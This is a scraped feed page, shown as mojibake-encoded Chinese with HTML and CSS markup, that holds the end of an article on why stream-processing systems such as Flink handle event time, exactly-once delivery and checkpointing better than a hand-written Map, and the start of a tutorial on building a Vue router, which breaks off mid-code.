pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>æ‘˜è¦ï¼šæœ¬æ–‡å°†é€šè¿‡ä¸€æ¬¡å…¸å‹å¯¹è¯çš„æ¼”è¿›ï¼Œæ­ç¤ºæµå¼ç³»ç»Ÿçš„çœŸæ­£ä»·å€¼ï¼šå®ƒå¹¶éå‘æ˜äº†ä»€ä¹ˆâ€œé»‘ç§‘æŠ€â€ï¼Œè€Œæ˜¯å°†åˆ†å¸ƒå¼ç³»ç»Ÿä¸­å¤šä¸ªè‰°æ·±éš¾é¢˜æœ‰æœºé›†æˆï¼Œå½¢æˆä¸€å¥—ç«¯åˆ°ç«¯å¯é ã€æ˜“ç”¨ã€é«˜æ•ˆçš„å·¥ç¨‹è§£å†³æ–¹æ¡ˆã€‚</p>
<p>ä¸ºä»€ä¹ˆæˆ‘ä»¬éœ€è¦æµå¼ç³»ç»Ÿï¼Ÿâ€”â€”ä»â€œä¸€ä¸ªMapèƒ½æå®šå—â€è¯´èµ·ã€‚</p>
<p>åœ¨å®æ—¶æ•°æ®å¤„ç†æ—¥ç›Šæ™®åŠçš„ä»Šå¤©ï¼Œå¾ˆå¤šäººä¼šé—®ï¼šâ€œä¸å°±æ˜¯ç»Ÿè®¡è¿‡å»5åˆ†é’Ÿçš„ç‚¹å‡»æ•°å—ï¼Ÿæˆ‘ç”¨ä¸ª Map ä¸å°±æå®šäº†ï¼Ÿä¸ºä»€ä¹ˆè¿˜è¦ä¸“é—¨æä¸€å¥—æµå¼ç³»ç»Ÿï¼Ÿâ€</p>
<p>ä¹ä¸€å¬ï¼Œè¿™é—®é¢˜åˆæƒ…åˆç†ã€‚æ¯•ç«Ÿï¼Œäº‹ä»¶å¸¦æ—¶é—´æˆ³ã€çŠ¶æ€å¯æŒä¹…åŒ–ã€é€»è¾‘çœ‹èµ·æ¥ç®€å•â€”â€”ä¼¼ä¹è‡ªå·±å†™ä¸ªæœåŠ¡å®Œå…¨å¤Ÿç”¨ã€‚ä½†æ·±å…¥ç”Ÿäº§å®è·µå°±ä¼šå‘ç°ï¼šçœ‹ä¼¼ç®€å•çš„å®æ—¶éœ€æ±‚ï¼Œåœ¨é«˜å¹¶å‘ã€åˆ†å¸ƒå¼ã€7Ã—24 å°æ—¶è¿è¡Œçš„çœŸå®ä¸–ç•Œä¸­ï¼Œä¼šæš´éœ²å‡ºä¸€ç³»åˆ—å¤æ‚è€Œéšè”½çš„æŒ‘æˆ˜ã€‚</p>
<p>æœ¬æ–‡å°†é€šè¿‡ä¸€æ¬¡å…¸å‹å¯¹è¯çš„æ¼”è¿›ï¼Œæ­ç¤ºæµå¼ç³»ç»Ÿçš„çœŸæ­£ä»·å€¼ï¼šå®ƒå¹¶éå‘æ˜äº†ä»€ä¹ˆâ€œé»‘ç§‘æŠ€â€ï¼Œè€Œæ˜¯å°†åˆ†å¸ƒå¼ç³»ç»Ÿä¸­å¤šä¸ªè‰°æ·±éš¾é¢˜æœ‰æœºé›†æˆï¼Œå½¢æˆä¸€å¥—ç«¯åˆ°ç«¯å¯é ã€æ˜“ç”¨ã€é«˜æ•ˆçš„å·¥ç¨‹è§£å†³æ–¹æ¡ˆã€‚</p>
<h2 data-id="heading-0">ä¸€ã€ä½ ä»¥ä¸ºçš„â€œç®€å•å®ç°â€</h2>
<p>è®¾æƒ³ä¸€ä¸ªéœ€æ±‚ï¼šç»Ÿè®¡æ¯ä¸ªç”¨æˆ·åœ¨è¿‡å»5åˆ†é’Ÿå†…çš„ç‚¹å‡»æ¬¡æ•°ã€‚</p>
<p>ç›´è§‰æ–¹æ¡ˆï¼š</p>
<ul>
<li>ç”¨ Mapå­˜å‚¨ç‚¹å‡»è®°å½•ï¼›</li>
<li>æ¯æ¬¡äº‹ä»¶åˆ°æ¥ï¼ŒæŒ‰äº‹ä»¶è‡ªå¸¦çš„æ—¶é—´æˆ³æ’å…¥ï¼›</li>
<li>å®šæœŸæ¸…ç†è¶…è¿‡5åˆ†é’Ÿçš„æ•°æ®ï¼›</li>
<li>çŠ¶æ€å®šæœŸæŒä¹…åŒ–ï¼ŒæœåŠ¡é‡å¯ååŠ è½½ã€‚</li>
</ul>
<p>â€œè¿™æœ‰ä»€ä¹ˆéš¾çš„ï¼Ÿâ€â€”â€”è¿™æ˜¯å¾ˆå¤šå·¥ç¨‹å¸ˆçš„ç¬¬ä¸€ååº”ã€‚</p>
<p>ç¡®å®ï¼Œåœ¨ç†æƒ³ç¯å¢ƒä¸‹ï¼ˆå•æœºã€æ— æ•…éšœã€æ— å»¶è¿Ÿã€æ— é‡å¤ï¼‰ï¼Œè¿™ä¸ªæ–¹æ¡ˆèƒ½è·‘èµ·æ¥ã€‚ä½†ç°å®è¿œæ¯”ç†æƒ³æ®‹é…·ã€‚</p>
<h2 data-id="heading-1">äºŒã€çœŸå®ä¸–ç•Œçš„äº”å¤§å…³é”®éš¾ç‚¹</h2>
<ol>
<li>
<p>æ—¶é—´è¯­ä¹‰ï¼šäº‹ä»¶æ—¶é—´ vs å¤„ç†æ—¶é—´
ç½‘ç»œå»¶è¿Ÿå¯èƒ½å¯¼è‡´äº‹ä»¶æ™šåˆ°å‡ åˆ†é’Ÿã€‚è‹¥ä»¥â€œæ”¶åˆ°æ—¶é—´â€åˆ¤æ–­çª—å£å½’å±ï¼Œç»“æœå¿…ç„¶é”™è¯¯ã€‚<br/>
âœ… æµå¼ç³»ç»Ÿå¼•å…¥ äº‹ä»¶æ—¶é—´ï¼ˆEvent Timeï¼‰ + æ°´ä½çº¿ï¼ˆWatermarkï¼‰ï¼Œæ­£ç¡®å¤„ç†ä¹±åºä¸å»¶è¿Ÿã€‚</p>
</li>
<li>
<p>ç²¾ç¡®ä¸€æ¬¡ï¼ˆExactly-Onceï¼‰è¯­ä¹‰
é‡è¯•ã€é‡æŠ•é€’ä¼šå¯¼è‡´äº‹ä»¶é‡å¤ï¼›æœåŠ¡å´©æºƒå¯èƒ½é€ æˆä¸¢å¤±ã€‚<br/>
âœ… æµå¼ç³»ç»Ÿé€šè¿‡ Checkpoint + è¾“å…¥æº offset è”åˆæäº¤ï¼Œå®ç°ç«¯åˆ°ç«¯ç²¾ç¡®ä¸€æ¬¡å¤„ç†ã€‚</p>
</li>
<li>
<p>å®¹é”™ä¸çŠ¶æ€ä¸€è‡´æ€§
æœåŠ¡é‡å¯åï¼Œå†…å­˜çŠ¶æ€æ¸…é›¶ï¼Œå†å²æ•°æ®ä¸¢å¤±ã€‚<br/>
âœ… æµå¼ç³»ç»Ÿé‡‡ç”¨ åˆ†å¸ƒå¼å¿«ç…§ï¼ˆå¦‚ Chandy-Lamport æˆ– Flink Barrier æœºåˆ¶ï¼‰ï¼Œç”Ÿæˆå…¨å±€ä¸€è‡´çš„çŠ¶æ€å¿«ç…§ï¼Œæ•…éšœæ¢å¤åä¸å¤šä¸å°‘ã€‚</p>
</li>
<li>
<p>çŠ¶æ€ç®¡ç†ä¸èµ„æºæ§åˆ¶
ç™¾ä¸‡ç”¨æˆ·æ´»è·ƒæ—¶ï¼ŒMap å†…å­˜çˆ†ç‚¸ï¼›é•¿æœŸä¸æ´»è·ƒç”¨æˆ·çŠ¶æ€æ— æ³•æ¸…ç†ï¼›å•ç‚¹æ— æ³•æ‰©å±•ã€‚<br/>
âœ… æµå¼ç³»ç»Ÿæä¾› State TTLã€RocksDB çŠ¶æ€åç«¯ã€Key åˆ†åŒºã€è‡ªåŠ¨åå‹ï¼Œä¿éšœç¨³å®šæ€§ä¸æ‰©å±•æ€§ã€‚</p>
</li>
<li>
<p>åˆ†å¸ƒå¼ä¸€è‡´æ€§
å¤šå®ä¾‹éƒ¨ç½²ä¸‹ï¼ŒåŒä¸€ç”¨æˆ·çš„äº‹ä»¶å¯èƒ½è¢«ä¸åŒèŠ‚ç‚¹å¤„ç†ï¼Œå¯¼è‡´è®¡æ•°åˆ†è£‚ã€‚<br/>
âœ… æµå¼ç³»ç»Ÿé€šè¿‡ KeyBy åˆ†åŒºï¼Œç¡®ä¿åŒä¸€ key çš„æ‰€æœ‰äº‹ä»¶ç”±åŒä¸€ä»»åŠ¡å¤„ç†ï¼ŒçŠ¶æ€å¤©ç„¶é›†ä¸­ã€‚</p>
</li>
</ol>
<h2 data-id="heading-2">ä¸‰ã€æµå¼ç³»ç»Ÿçš„æœ¬è´¨ï¼šä¼˜ç§€é›†æˆï¼Œè€Œéå…¨æ–°å‘æ˜</h2>
<p>æµå¼ç³»ç»Ÿï¼ˆå¦‚ Apache Flinkã€Kafka Streamsï¼‰å¹¶æ²¡æœ‰å‡­ç©ºåˆ›é€ æ–°ç†è®ºã€‚å®ƒçš„æ ¸å¿ƒç»„ä»¶éƒ½æºäºç»å…¸åˆ†å¸ƒå¼ç³»ç»Ÿç ”ç©¶ï¼š</p>
<ul>
<li>Chandy-Lamport å¿«ç…§ç®—æ³• â†’ å…¨å±€ä¸€è‡´æ€§ Checkpoint</li>
<li>ä¸¤é˜¶æ®µæäº¤ï¼ˆ2PCï¼‰æ€æƒ³ â†’ ç«¯åˆ°ç«¯ Exactly-Once</li>
<li>æ°´ä½çº¿ï¼ˆWatermarkï¼‰ â†’ äº‹ä»¶æ—¶é—´è¿›åº¦ä¼°è®¡</li>
<li>LSM-Tree / RocksDB â†’ å¤§çŠ¶æ€é«˜æ•ˆå­˜å‚¨</li>
<li>Credit-based æµæ§ â†’ èƒŒå‹ä¸é€Ÿç‡åŒ¹é…</li>
</ul>
<p>ä½†å…³é”®åœ¨äºï¼šå®ƒæŠŠè¿™äº›æŠ€æœ¯æ— ç¼æ•´åˆæˆä¸€ä¸ªç»Ÿä¸€æ‰§è¡Œæ¨¡å‹ï¼Œå¹¶é€šè¿‡ç®€æ´ APIï¼ˆå¦‚ keyBy().window().process()ï¼‰æš´éœ²ç»™å¼€å‘è€…ã€‚</p>
<p>è¿™å°±åƒç°ä»£æ±½è½¦ï¼šå‘åŠ¨æœºã€å˜é€Ÿç®±ã€ABSã€å®‰å…¨æ°”å›Šå„è‡ªéƒ½æœ‰ç™¾å¹´å†å²ï¼Œä½†åªæœ‰å°†å®ƒä»¬ååŒè®¾è®¡ï¼Œæ‰èƒ½é€ å‡ºä¸€è¾†å®‰å…¨ã€èˆ’é€‚ã€å¯é çš„è½¦ã€‚</p>
<h2 data-id="heading-3">å››ã€ä¸ºä»€ä¹ˆâ€œè‡ªå·±å†™â€éš¾ä»¥æ›¿ä»£ï¼Ÿ</h2>
<p>ä½ å¯ä»¥ç”¨ Redis + å®šæ—¶ä»»åŠ¡ + å»é‡ ID å®ç°ä¸€ä¸ªâ€œè¿‘ä¼¼å¯ç”¨â€çš„ç‰ˆæœ¬ã€‚ä½†åœ¨ä»¥ä¸‹åœºæ™¯ä¸­ï¼Œè‡ªç ”æ–¹æ¡ˆææ˜“å¤±æ•ˆï¼š</p>
<ul>
<li>é«˜ååä¸‹çŠ¶æ€è†¨èƒ€å¯¼è‡´ OOM</li>
<li>æ•…éšœæ¢å¤åå‡ºç°é™é»˜æ•°æ®åå·®</li>
<li>è¿Ÿåˆ°äº‹ä»¶æ— æ³•æ­£ç¡®å½’å…¥çª—å£</li>
<li>æ‰©å®¹æ—¶çŠ¶æ€è¿ç§»å¤æ‚ä¸”æ˜“é”™</li>
<li>ç¼ºä¹å¯è§‚æµ‹æ€§ï¼Œé—®é¢˜éš¾ä»¥å®šä½</li>
</ul>
<p>è€Œæˆç†Ÿçš„æµå¼ç³»ç»Ÿç»è¿‡å¤§è§„æ¨¡ç”Ÿäº§éªŒè¯ï¼Œå†…ç½®äº†ç›‘æ§ã€è°ƒä¼˜ã€å®¹ç¾ã€å‡çº§ç­‰å®Œæ•´ç”Ÿå‘½å‘¨æœŸæ”¯æŒã€‚</p>
<h2 data-id="heading-4">äº”ã€æ€»ç»“ï¼šä¸æ˜¯ä¸èƒ½ï¼Œè€Œæ˜¯ä¸å€¼å¾—</h2>
<p>å¯¹äºä½é¢‘ã€éå…³é”®ã€å°è§„æ¨¡åœºæ™¯ï¼Œè½»é‡çº§è‡ªç ”æ–¹æ¡ˆå®Œå…¨å¯è¡Œã€‚</p>
<p>ä½†å¯¹äºå¼ºä¸€è‡´æ€§ã€ä½å»¶è¿Ÿã€é«˜å¯ç”¨ã€å¤§è§„æ¨¡çš„å®æ—¶ä¸šåŠ¡ï¼ˆå¦‚é£æ§ã€æ¨èã€ç›‘æ§ã€è®¡è´¹ï¼‰ï¼Œæµå¼ç³»ç»Ÿæä¾›çš„ç«¯åˆ°ç«¯å¯é æ€§ä¿éšœï¼Œæ˜¯ç¢ç‰‡åŒ–æ‹¼å‡‘éš¾ä»¥ä¼åŠçš„ã€‚</p>
<p>æµå¼ç³»ç»Ÿçš„ä¸å¯æ›¿ä»£æ€§ï¼Œä¸åœ¨äºå®ƒåšäº†åˆ«äººåšä¸åˆ°çš„äº‹ï¼Œè€Œåœ¨äºå®ƒæŠŠä¸€å †â€œå¾ˆéš¾åšå¯¹â€çš„äº‹ï¼Œå˜æˆäº†â€œé»˜è®¤åšå¯¹â€ã€‚</p>
<p>å®ƒä¸æ˜¯é“¶å¼¹ï¼Œä½†å®ƒæ˜¯ç«™åœ¨åˆ†å¸ƒå¼ç³»ç»Ÿå·¨äººè‚©è†€ä¸Šçš„æœ€ä½³å®è·µé›†æˆä½“ã€‚ç†è§£è¿™ä¸€ç‚¹ï¼Œæˆ‘ä»¬å°±èƒ½æ—¢ä¸ç›²ç›®å´‡æ‹œï¼Œä¹Ÿä¸è½»æ˜“ä½ä¼°â€”â€”è€Œæ˜¯åœ¨åˆé€‚çš„åœºæ™¯ï¼Œç”¨åˆé€‚çš„å·¥å…·ï¼Œè§£å†³çœŸæ­£çš„é—®é¢˜ã€‚</p>
<p>æ­£å¦‚ä¸€å¥è€è¯æ‰€è¯´ï¼š</p>
<p>â€œç®€å•æ˜¯å¤æ‚çš„ç»ˆæå½¢å¼ã€‚â€</p>
<p>è€Œæµå¼ç³»ç»Ÿï¼Œæ­£æ˜¯å°†å®æ—¶è®¡ç®—çš„å¤æ‚æ€§ï¼Œå°è£…æˆäº†å¼€å‘è€…çš„ç®€å•ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[ä»é›¶è®¾è®¡ä¸€ä¸ªVueè·¯ç”±ç³»ç»Ÿï¼šæ­ç§˜SPAå¯¼èˆªçš„æ ¸å¿ƒåŸç†]]></title>    <link>https://juejin.cn/post/7590011643296333862</link>    <guid>https://juejin.cn/post/7590011643296333862</guid>    <pubDate>2026-01-02T03:30:27.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7590011643296333862" data-draft-id="7590503651115532338" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="ä»é›¶è®¾è®¡ä¸€ä¸ªVueè·¯ç”±ç³»ç»Ÿï¼šæ­ç§˜SPAå¯¼èˆªçš„æ ¸å¿ƒåŸç†"/> <meta itemprop="keywords" content="å‰ç«¯,Vue.js"/> <meta itemprop="datePublished" content="2026-01-02T03:30:27.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="åŒ—è¾°alk"/> <meta itemprop="url" content="https://juejin.cn/user/1772855673241352"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            ä»é›¶è®¾è®¡ä¸€ä¸ªVueè·¯ç”±ç³»ç»Ÿï¼šæ­ç§˜SPAå¯¼èˆªçš„æ ¸å¿ƒåŸç†
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1772855673241352/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    åŒ—è¾°alk
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-02T03:30:27.000Z" title="Fri Jan 02 2026 03:30:27 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-02
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»3åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><blockquote>
<p>æƒ³æ·±å…¥ç†è§£Vueè·¯ç”±ï¼Ÿè‡ªå·±åŠ¨æ‰‹å®ç°ä¸€ä¸ªï¼æœ¬æ–‡å°†å¸¦ä½ ä»é›¶è®¾è®¡å®Œæ•´çš„è·¯ç”±ç³»ç»Ÿï¼Œå½»åº•æŒæ¡å‰ç«¯è·¯ç”±çš„æ ¸å¿ƒåŸç†ã€‚</p>
</blockquote>
<h2 data-id="heading-0">å‰è¨€ï¼šä¸ºä»€ä¹ˆéœ€è¦å‰ç«¯è·¯ç”±ï¼Ÿ</h2>
<p>åœ¨ä¼ ç»Ÿçš„å¤šé¡µé¢åº”ç”¨ä¸­ï¼Œæ¯æ¬¡é¡µé¢è·³è½¬éƒ½éœ€è¦å‘æœåŠ¡å™¨è¯·æ±‚æ–°é¡µé¢ï¼Œç”¨æˆ·ä½“éªŒå­˜åœ¨æ˜æ˜¾çš„ä¸­æ–­æ„Ÿã€‚è€Œç°ä»£å•é¡µé¢åº”ç”¨ï¼ˆSPAï¼‰ä½¿ç”¨å‰ç«¯è·¯ç”±ï¼Œå®ç°äº†æ— åˆ·æ–°é¡µé¢åˆ‡æ¢ï¼Œå¤§å¤§æå‡äº†ç”¨æˆ·ä½“éªŒã€‚</p>
<p>ä»Šå¤©ï¼Œæˆ‘ä»¬å°±æ¥äº²æ‰‹å®ç°ä¸€ä¸ªå®Œæ•´çš„Vueè·¯ç”±ç³»ç»Ÿï¼Œæ·±å…¥ç†è§£å…¶å·¥ä½œåŸç†ï¼</p>
<h2 data-id="heading-1">ä¸€ã€è·¯ç”±ç³»ç»Ÿæ ¸å¿ƒæ¦‚å¿µ</h2>
<h3 data-id="heading-2">1.1 è·¯ç”±ç³»ç»Ÿä¸‰å¤§æ ¸å¿ƒ</h3>
<ul>
<li><strong>è·¯ç”±å™¨ï¼ˆRouterï¼‰</strong>ï¼šç®¡ç†æ‰€æœ‰è·¯ç”±è§„åˆ™å’ŒçŠ¶æ€</li>
<li><strong>è·¯ç”±è¡¨ï¼ˆRoutesï¼‰</strong>ï¼šå®šä¹‰è·¯å¾„ä¸ç»„ä»¶çš„æ˜ å°„å…³ç³»</li>
<li><strong>è·¯ç”±è§†å›¾ï¼ˆRouterViewï¼‰</strong>ï¼šåŠ¨æ€æ¸²æŸ“åŒ¹é…çš„ç»„ä»¶</li>
</ul>
<h3 data-id="heading-3">1.2 ä¸¤ç§è·¯ç”±æ¨¡å¼</h3>
<pre><code class="hljs language-bash" lang="bash">Hashæ¨¡å¼ï¼šä½¿ç”¨URLçš„<span class="hljs-built_in">hash</span>éƒ¨åˆ†ï¼ˆ<span class="hljs-comment">#åçš„å†…å®¹ï¼‰</span>
  ç¤ºä¾‹ï¼šhttp://example.com/<span class="hljs-comment">#/home</span>
  ä¼˜ç‚¹ï¼šå…¼å®¹æ€§å¥½ï¼Œæ— éœ€æœåŠ¡å™¨é…ç½®
  
Historyæ¨¡å¼ï¼šä½¿ç”¨HTML5 History API
  ç¤ºä¾‹ï¼šhttp://example.com/home
  ä¼˜ç‚¹ï¼šURLæ›´ç¾è§‚ï¼Œæ›´ç¬¦åˆä¼ ç»ŸURLä¹ æƒ¯
</code></pre>
<h2 data-id="heading-4">äºŒã€è·¯ç”±ç³»ç»Ÿæ¶æ„è®¾è®¡</h2>
<h3 data-id="heading-5">2.1 ç³»ç»Ÿæ¶æ„å›¾</h3>
<pre><code class="hljs language-mermaid" lang="mermaid">graph TD
    A[URLå˜åŒ–] --&gt; B{è·¯ç”±æ¨¡å¼}
    B --&gt;|Hashæ¨¡å¼| C[ç›‘å¬hashchangeäº‹ä»¶]
    B --&gt;|Historyæ¨¡å¼| D[ç›‘å¬popstateäº‹ä»¶]
    C --&gt; E[è§£æå½“å‰è·¯å¾„]
    D --&gt; E
    E --&gt; F[åŒ¹é…è·¯ç”±è§„åˆ™]
    F --&gt; G[æ‰§è¡Œå¯¼èˆªå®ˆå«]
    G --&gt; H[æ›´æ–°è·¯ç”±çŠ¶æ€]
    H --&gt; I[æ¸²æŸ“å¯¹åº”ç»„ä»¶]
    I --&gt; J[RouterViewæ›´æ–°]
</code></pre>
<h3 data-id="heading-6">2.2 æ ¸å¿ƒç±»è®¾è®¡</h3>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">class</span> <span class="hljs-title class_">VueRouter</span> {
  <span class="hljs-title function_">constructor</span>(<span class="hljs-params">options</span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">mode</span> = options.<span class="hljs-property">mode</span> || <span class="hljs-string">'hash'</span>
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">routes</span> = options.<span class="hljs-property">routes</span> || []
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">current</span> = { <span class="hljs-attr">path</span>: <span class="hljs-string">'/'</span>, <span class="hljs-attr">matched</span>: [] }
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">routeMap</span> = <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">createRouteMap</span>()
    <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">init</span>()
  }
}
</code></pre>
<h2 data-id="heading-7">ä¸‰ã€å®Œæ•´å®ç°æ­¥éª¤</h2>
<h3 data-id="heading-8">3.1 åˆ›å»ºè·¯ç”±æ˜ å°„è¡¨</h3>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">class</span> <span class="hljs-title class_">VueRouter</span> {
  <span class="hljs-title function_">constructor</span>(<span class="hljs-params">options</span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">options</span> = options
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">routeMap</span> = {}
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">current</span> = {
      <span class="hljs-attr">path</span>: <span class="hljs-string">'/'</span>,
      <span class="hljs-attr">query</span>: {},
      <span class="hljs-attr">params</span>: {},
      <span class="hljs-attr">fullPath</span>: <span class="hljs-string">'/'</span>,
      <span class="hljs-attr">matched</span>: []
    }
    
    <span class="hljs-comment">// åˆ›å»ºè·¯ç”±æ˜ å°„è¡¨</span>
    <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">createRouteMap</span>(options.<span class="hljs-property">routes</span> || [])
    
    <span class="hljs-comment">// åˆå§‹åŒ–è·¯ç”±</span>
    <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">init</span>()
  }
  
  <span class="hljs-title function_">createRouteMap</span>(<span class="hljs-params">routes, parentPath = <span class="hljs-string">''</span></span>) {
    routes.<span class="hljs-title function_">forEach</span>(<span class="hljs-function"><span class="hljs-params">route</span> =&gt;</span> {
      <span class="hljs-keyword">const</span> record = {
        <span class="hljs-attr">path</span>: parentPath + route.<span class="hljs-property">path</span>,
        <span class="hljs-attr">component</span>: route.<span class="hljs-property">component</span>,
        <span class="hljs-attr">parent</span>: parentPath,
